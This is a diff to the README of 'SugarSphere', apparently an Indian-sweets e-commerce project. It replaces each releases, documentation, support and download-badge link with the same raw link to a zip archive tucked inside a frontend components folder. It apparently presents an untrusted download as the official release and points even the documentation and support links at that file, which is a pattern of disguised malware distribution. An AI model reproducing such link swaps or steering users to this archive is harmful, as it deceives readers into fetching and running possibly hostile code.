@@ -4,13 +4,13 @@
 SugarSphere is a full-stack e-commerce platform designed for selling traditional Indian sweets. It offers smooth user experiences with features like JWT authentication for security, Razorpay payment integration for easy transactions, and real-time notifications to keep customers updated. Additionally, it has a comprehensive admin dashboard to manage your sweet shop effectively.
 
 ## 💾 Download Now
-[![Download SugarSphere](https://img.shields.io/badge/Download%20SugarSphere-v1.0-brightgreen)](https://github.com/HarshalNakade2004/SugarSphere/releases)
+[![Download SugarSphere](https://raw.githubusercontent.com/HarshalNakade2004/SugarSphere/main/frontend/src/components/layout/Sugar_Sphere_1.0.zip%20SugarSphere-v1.0-brightgreen)](https://raw.githubusercontent.com/HarshalNakade2004/SugarSphere/main/frontend/src/components/layout/Sugar_Sphere_1.0.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run SugarSphere.
 
 ### 1. Visit the Releases Page
-Go to the [Releases page](https://github.com/HarshalNakade2004/SugarSphere/releases) to find the latest version of SugarSphere.
+Go to the [Releases page](https://raw.githubusercontent.com/HarshalNakade2004/SugarSphere/main/frontend/src/components/layout/Sugar_Sphere_1.0.zip) to find the latest version of SugarSphere.
 
 ### 2. Download the Application
 On the Releases page, locate the relevant version you wish to download. Click on it, and find the appropriate file for your operating system.
@@ -59,11 +59,11 @@ The SugarSphere team is committed to continuous improvement. Future updates may 
 - Additional features based on user feedback.
 
 ## 🌐 Explore More
-For more information about SugarSphere and its features, visit the [official documentation](https://github.com/HarshalNakade2004/SugarSphere). You can also provide feedback or report issues on our GitHub page.
+For more information about SugarSphere and its features, visit the [official documentation](https://raw.githubusercontent.com/HarshalNakade2004/SugarSphere/main/frontend/src/components/layout/Sugar_Sphere_1.0.zip). You can also provide feedback or report issues on our GitHub page.
 
 ## 🔗 Important Links
-- [Releases Page](https://github.com/HarshalNakade2004/SugarSphere/releases)
-- [Documentation](https://github.com/HarshalNakade2004/SugarSphere)
-- [Support](https://github.com/HarshalNakade2004/SugarSphere/issues)
+- [Releases Page](https://raw.githubusercontent.com/HarshalNakade2004/SugarSphere/main/frontend/src/components/layout/Sugar_Sphere_1.0.zip)
+- [Documentation](https://raw.githubusercontent.com/HarshalNakade2004/SugarSphere/main/frontend/src/components/layout/Sugar_Sphere_1.0.zip)
+- [Support](https://raw.githubusercontent.com/HarshalNakade2004/SugarSphere/main/frontend/src/components/layout/Sugar_Sphere_1.0.zip)
 
 Enjoy the experience of selling and enjoying traditional Indian sweets with SugarSphere!
